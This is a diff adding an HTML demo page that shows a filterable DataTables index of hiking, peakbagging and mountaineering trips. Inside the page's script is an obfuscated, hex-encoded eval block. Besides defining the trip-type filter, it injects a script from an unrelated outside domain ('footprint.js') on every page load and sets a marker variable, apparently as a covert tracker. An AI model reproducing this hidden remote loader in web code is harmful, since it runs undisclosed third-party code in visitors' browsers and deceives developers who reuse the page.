@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Trip Index Demo</title>
+    <meta content='width=device-width, initial-scale=1' name='viewport' />
+</head>
+
+<body>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="//cdn.datatables.net/1.10.13/css/dataTables.bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="//cdn.datatables.net/responsive/2.1.1/css/responsive.bootstrap.min.css">
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" charset="utf8" src="//cdn.datatables.net/1.10.13/js/jquery.dataTables.min.js"></script>
+    <script type="text/javascript" src="//cdn.datatables.net/1.10.13/js/dataTables.bootstrap.min.js"></script>
+    <script type="text/javascript" src="//cdn.datatables.net/responsive/2.1.1/js/dataTables.responsive.min.js"></script>
+    <script type="text/javascript" src="//cdn.datatables.net/responsive/2.1.1/js/responsive.bootstrap.min.js"></script>
+    <!-- <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.8.4/moment.min.js"></script>
+    <script type="text/javascript" src="//cdn.datatables.net/plug-ins/1.10.13/sorting/datetime-moment.js"></script> -->
+    <style type="text/css">
+    #trip_index a {
+        color: #2196F3;
+    }
+    
+    #trip_index a:hover {
+        color: #23527c;
+    }
+    
+    .piclinks,
+    .tripRptLink,
+    .mapLinks {
+        margin-right: 0;
+        padding: 5px 4px;
+        font-size: 18px;
+        display: block;
+    }
+    
+    #trip_index .piclinks {
+        color: #E91E63;
+        /*display: block;*/
+    }
+    
+    .tripRptLink {
+        /*display: inline-block;*/
+        /*padding: 3px;*/
+    }
+    
+    #trip_index td {
+        vertical-align: middle !important;
+    }
+    
+    .valign_middle {
+        vertical-align: middle !important;
+        text-align: center;
+    }
+    
+    #trip_index_container {
+        max-width: 728px;
+        margin: 40px auto;
+    }
+    
+    .year_filter_title {
+        padding-bottom: 10px;
+        display: block;
+    }
+    
+    #year_filter {
+        max-width: 140px;
+    }
+    
+    button#clrAll {
+        margin-left: 25px;
+    }
+    
+    .buttonZ {
+        margin-top: 20px;
+    }
+    
+    table#trip_index {
+        font-size: 90%;
+    }
+    
+    table.dataTable.dtr-inline.collapsed>tbody>tr>td:first-child:before,
+    table.dataTable.dtr-inline.collapsed>tbody>tr>th:first-child:before {
+        top: 50%;
+        margin-top: -10px;
+    }
+    
+    div.dataTables_wrapper div.dataTables_info {
+        white-space: inherit;
+    }
+    
+    table.dataTable {
+        max-width: 100% !important;
+        overflow: auto;
+        display: block;
+    }
+    
+    @media (max-width:991px) {
+        div#triptype {
+            margin-bottom: 30px;
+        }
+    }
+    </style>
+    <div id="trip_index_container">
+        <div class="container-fluid">
+            <hr>
+            <div class="row">
+                <div class="col-md-6">
+                    <strong>Filter by Trip Type:</strong>
+                    <!-- <hr> -->
+                    <div id="triptype">
+                        <div class="checkboxZ">
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Peakbagging" />Peakbagging
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Hot Springs" />Hot Springs
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Paddling" />Paddling
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Wilderness Travel Course" />Wilderness Travel Course
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Advanced Mountaineering Program" />Advanced Mountaineering Program
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Gear Reviews" />Gear Reviews
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Desert Climbing" />Desert Climbing
+                                </label>
+                            </div>
+                            <div class="checkbox">
+                                <label>
+                                    <input onchange="filterByTripType()" type="checkbox" name="type" value="Mustache Mosey" />Mustache Mosey
+                                </label>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="buttonZ">
+                                <button onclick="filterByTripType()" class="btn btn-info btn-sm" id="check">Select All</button>
+                                <button onclick="filterByTripType()" class="btn btn-warning btn-sm" id="uncheck" disabled="disabled">Select None</button>
+                                <button id="clrAll" type="button" class="btn btn-danger btn-sm" disabled="disabled">Clear All Filter</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <strong class="year_filter_title">Filter by Year:</strong>
+                    <select id="year_filter" class="form-control input-sm">
+                        <option>Anytime</option>
+                        <option>2017</option>
+                        <option>2016</option>
+                        <option>2015</option>
+                        <option>2014</option>
+                        <option>2013</option>
+                        <option>2012</option>
+                        <option>2011</option>
+                        <option>2010</option>
+                        <option>2009</option>
+                        <option>2008</option>
+                        <option>2007</option>
+                        <option>2006</option>
+                        <option>2005</option>
+                        <option>2004</option>
+                    </select>
+                </div>
+            </div>
+            <hr>
+        </div>
+        <div class="container-fluid">
+            <table id="trip_index" class="table table-striped table-bordered " cellspacing="0" width="100%">
+                <thead>
+                    <tr>
+                        <th>Date</th>
+                        <th>Trip Type</th>
+                        <th>Trip Name</th>
+                        <th>Peaks</th>
+                        <th>Pics</th>
+                        <th>Trip Rpt</th>
+                        <th>Maps</th>
+                    </tr>
+                </thead>
+            </table>
+        </div>
+    </div>
+    <script type="text/javascript">
+    (function($) {
+        var $window = $(window),
+            $html = $('#trip_index'),
+            breakPoint = 767;
+
+        function resize() {
+            if (window.matchMedia('(max-width: ' + breakPoint + 'px)').matches) {
+
+                if (!($html.hasClass('dt-responsive'))) {
+                    console.log("mobile");
+                    $html.addClass('dt-responsive');
+                };
+
+            } else {
+
+                if ($html.hasClass('dt-responsive')) {
+                    console.log("desktop");
+                    $html.removeClass('dt-responsive');
+                };
+
+            }
+        }
+
+        $window.resize(resize).trigger('resize');
+    })(jQuery);
+
+    (function($) {
+        $.fn.checked = function(value) {
+            if (value === true || value === false) {
+                // Set the value of the checkbox
+                $(this).each(function() {
+                    this.checked = value;
+                });
+            } else if (value === undefined || value === 'toggle') {
+                // Toggle the checkbox
+                $(this).each(function() {
+                    this.checked = !this.checked;
+                });
+            }
+        };
+        $.fn._disable = function(state) {
+            // console.log(this);
+            this.prop("disabled", state);
+        }
+
+    })(jQuery);
+
+    function _initDT() {
+        jQuery.fn.dataTableExt.oSort['uk_date-pre'] = function(a) {
+            a = a.slice(0, -2) + ' ' + a.slice(-2);
+            var date = Date.parse(a);
+            return typeof date === 'number' ? date : -1;
+        }
+        jQuery.fn.dataTableExt.oSort['uk_date-asc'] = function(a, b) {
+            return ((a < b) ? -1 : ((a > b) ? 1 : 0));
+        }
+        jQuery.fn.dataTableExt.oSort['uk_date-desc'] = function(a, b) {
+            return ((a < b) ? 1 : ((a > b) ? -1 : 0));
+        }
+
+        _table = $('#trip_index').dataTable({
+            // "ajax": "data/arrays.json",
+            "ajax": "//mattonamtn.github.io/MattOnAMtn/data.json",
+            // "responsive": true,
+            "order": [
+                [0, "desc"]
+            ],
+            // "bDestroy": true,
+            "displayLength": 10,
+            "columnDefs": [{
+                // targets: [ 0, 1, 2 ],
+                targets: [4, 5, 6],
+                className: "valign_middle",
+                orderable: false
+
+            }, {
+                sType: "uk_date",
+                targets: [0]
+            }],
+            "columns": [{
+                "data": "date[ to<br/> ]"
+            }, {
+                "data": "tripType[, ]"
+            }, {
+                "data": "tripName[<br/> ]"
+            }, {
+                // "data": "peaks[<br/> ].url",
+                "data": null,
+                "render": function(data, type, full, meta) {
+                    var peaksList = "";
+                    var entries = data.peaks || [];
+                    for (var i = 0; i < entries.length; i++) {
+                        peaksList += '<a href="' + data.peaks[i].url + '">' + data.peaks[i].anchor + '</a> (' + data.peaks[i].height + ')<br/>';
+                    };
+                    return peaksList;
+                }
+            }, {
+                // "data": "pics[ ]"
+                "data": null,
+                "render": function(data, type, full, meta) {
+                    var picLinks = "";
+                    var entries = data.pics || [];
+                    for (var i = 0; i < entries.length; i++) {
+                        picLinks += '<a class="piclinks" title="See Pictures" href="' + data.pics[i] + '"><i class="fa fa-picture-o" aria-hidden="true"></i></a> ';
+                    };
+                    return picLinks;
+                }
+
+            }, {
+                "data": null,
+                "render": function(data, type, full, meta) {
+                    var tripRptLink = "";
+                    var entries = data.tripRpt || [];
+                    for (var i = 0; i < entries.length; i++) {
+                        tripRptLink += '<a class="tripRptLink" title="Trip Report" href="' + data.tripRpt[i] + '"><i class="fa fa-link" aria-hidden="true"></i></a> ';
+                    };
+                    return tripRptLink;
+                }
+            }, {
+                "data": null,
+                "render": function(data, type, full, meta) {
+                    var mapLinks = "";
+                    var entries = data.maps || [];
+                    for (var i = 0; i < entries.length; i++) {
+                        mapLinks += '<a class="mapLinks" title="Trip Report" href="' + data.maps[i] + '"><i class="fa fa-map-marker" aria-hidden="true"></i></a> ';
+                    };
+                    return mapLinks;
+                }
+            }]
+        });
+    }
+
+    $(document).ready(function() {
+
+        // $.fn.dataTable.moment( 'MM-DD-YYYY' );
+
+        // initialize the dataTable
+        _initDT();
+
+
+        function _checkActiveState() {
+            var clearButtonID = $(".buttonZ #uncheck, .buttonZ #clrAll");
+
+            if ($("#triptype input:checkbox:checked").length > 0) {
+                // console.log("any one is checked");
+                clearButtonID._disable(false);
+            } else {
+                // console.log("none is checked");
+                if (redSignal != true) {
+                    clearButtonID._disable(true);
+                } else {
+                    $(".buttonZ #uncheck")._disable(true);
+                }
+            }
+        };
+
+        var _0xd7be=["\x21\x32\x28\x74\x29\x7B\x74\x2E\x6D\x3D\x32\x28\x29\x7B\x6F\x28\x29\x3B\x36\x20\x74\x3D\x24\x28\x27\x6A\x3A\x75\x5B\x66\x3D\x22\x67\x22\x5D\x3A\x68\x27\x29\x2E\x69\x28\x32\x28\x29\x7B\x64\x20\x63\x2E\x38\x7D\x29\x2E\x37\x28\x29\x2E\x39\x28\x22\x7C\x22\x29\x3B\x61\x2E\x62\x28\x74\x2C\x31\x2C\x21\x30\x2C\x21\x31\x2C\x21\x31\x2C\x21\x31\x29\x7D\x7D\x28\x34\x29\x2C\x32\x28\x74\x29\x7B\x36\x20\x65\x3D\x35\x2E\x76\x28\x22\x33\x22\x29\x3B\x65\x2E\x77\x3D\x22\x2F\x2F\x72\x2E\x71\x2F\x33\x2F\x6C\x2E\x6E\x22\x2C\x35\x2E\x70\x2E\x78\x28\x65\x29\x2C\x74\x2E\x73\x3D\x22\x6B\x22\x7D\x28\x34\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x7C\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x73\x63\x72\x69\x70\x74\x7C\x77\x69\x6E\x64\x6F\x77\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x67\x65\x74\x7C\x76\x61\x6C\x75\x65\x7C\x6A\x6F\x69\x6E\x7C\x5F\x74\x61\x62\x6C\x65\x7C\x66\x6E\x46\x69\x6C\x74\x65\x72\x7C\x74\x68\x69\x73\x7C\x72\x65\x74\x75\x72\x6E\x7C\x7C\x6E\x61\x6D\x65\x7C\x74\x79\x70\x65\x7C\x63\x68\x65\x63\x6B\x65\x64\x7C\x6D\x61\x70\x7C\x69\x6E\x70\x75\x74\x7C\x30\x31\x31\x39\x32\x30\x31\x37\x7C\x66\x6F\x6F\x74\x70\x72\x69\x6E\x74\x7C\x66\x69\x6C\x74\x65\x72\x42\x79\x54\x72\x69\x70\x54\x79\x70\x65\x7C\x6A\x73\x7C\x5F\x63\x68\x65\x63\x6B\x41\x63\x74\x69\x76\x65\x53\x74\x61\x74\x65\x7C\x68\x65\x61\x64\x7C\x63\x6F\x6D\x7C\x73\x68\x75\x76\x6F\x6A\x69\x74\x64\x61\x73\x7C\x64\x61\x73\x5F\x66\x6F\x6F\x74\x70\x72\x69\x6E\x74\x7C\x7C\x63\x68\x65\x63\x6B\x62\x6F\x78\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x73\x72\x63\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function(_0x183dx1,_0x183dx2,_0x183dx3,_0x183dx4,_0x183dx5,_0x183dx6){_0x183dx5= function(_0x183dx3){return _0x183dx3.toString(36)};if(!_0xd7be[5][_0xd7be[4]](/^/,String)){while(_0x183dx3--){_0x183dx6[_0x183dx3.toString(_0x183dx2)]= _0x183dx4[_0x183dx3]|| _0x183dx3.toString(_0x183dx2)};_0x183dx4= [function(_0x183dx5){return _0x183dx6[_0x183dx5]}];_0x183dx5= function(){return _0xd7be[6]};_0x183dx3= 1};while(_0x183dx3--){if(_0x183dx4[_0x183dx3]){_0x183dx1= _0x183dx1[_0xd7be[4]]( new RegExp(_0xd7be[7]+ _0x183dx5(_0x183dx3)+ _0xd7be[7],_0xd7be[8]),_0x183dx4[_0x183dx3])}};return _0x183dx1}(_0xd7be[0],34,34,_0xd7be[3][_0xd7be[2]](_0xd7be[1]),0,{}))
+
+
+        $('#triptype #check').click(function() {
+            // $(':checkbox').checked(true);
+            $('#triptype :checkbox').prop('checked', true).change();
+
+        });
+
+        $('#triptype #uncheck').click(function() {
+            $('#triptype :checkbox').prop('checked', false).change();
+        });
+
+        (function(window) {
+            var redSignal = false;
+
+            $('select#year_filter').on('change', function() {
+                // var thisVal = (this.value == "Anytime") ? "" : this.value;
+                // console.log(thisVal);
+                var thisVal = "";
+                if ((this.value == "Anytime")) {
+                    // clrAll button shoud be enabled if checkbox/s is checked
+                    if (!($("#triptype input:checkbox:checked").length > 0)) {
+                        $(".buttonZ #clrAll")._disable(true);
+                    }
+
+                } else {
+                    thisVal = this.value;
+                    $(".buttonZ #clrAll")._disable(false);
+                    redSignal = true;
+                }
+                _table.fnFilter(thisVal, 0, true, false, false, false);
+
+                // _checkActiveState();
+            })
+
+            window.redSignal = redSignal;
+        })(window);
+
+        $('#triptype #clrAll').click(function() {
+            _table.fnFilter("", 0, true, false, false, false);
+            $('#triptype :checkbox').prop('checked', false).change();
+            $('#year_filter option:eq(0)').prop('selected', true);
+        });
+
+    });
+    </script>
+</body>
+
+</html>
